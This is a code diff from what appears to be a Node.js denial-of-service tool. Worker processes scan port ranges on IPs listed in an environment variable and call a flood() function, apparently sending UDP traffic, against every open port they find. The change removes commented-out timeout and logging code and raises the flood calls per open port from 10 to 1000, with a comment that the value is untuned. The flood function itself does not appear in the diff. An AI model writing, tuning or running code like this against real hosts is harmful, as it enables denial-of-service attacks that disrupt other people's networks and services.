@@ -54,16 +54,9 @@ if (host) {
         const ips = process.env['IPS'].split(',');
         const workerId = process.env['WORKER_ID'];
         let startTime = new Date();
-        // while(1){
-        //     if (timeout) {
-        //         let nowTime = new Date();
-        //         if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
-        //             console.log('Timeout Reached for pid: ' + process.pid);
-        //             break;
-        //         }
-        //     }
+
         for (let i = 0; i < ips.length; i++) {
-            const ip = ips[i];
+            const ip = ips[i];//TODO this part needs comments
             let [start, end] = findStartAndEndPorts(workerId, numCPUs);
             console.log(`*** Worker ${process.pid} starting on ${ip} using range: (${start}, ${end}) ***`);
             const N = 8000;
@@ -83,12 +76,8 @@ if (host) {
                     }
                     if (port) {
                         console.log('*** Worker ' + process.pid + ' found open port:' + port);
-                        for (let i = 0; i <= 10; i++) {//TODO This number may vary
+                        for (let i = 0; i <= 1000; i++) {//TODO This number may vary, it's the number of request to fire to the open port, I did not had much time to tweak it properly
                             flood(type, ip, port, port, timeout)
-                            //     .then(function (results) {
-                            //     const [pid, bytes, HOST, port, socketAddress, socketPort] = results;
-                            //     console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socketAddress + ':' + socketPort);
-                            // });
                             // console.log('I am flooding');
                         }
                     }
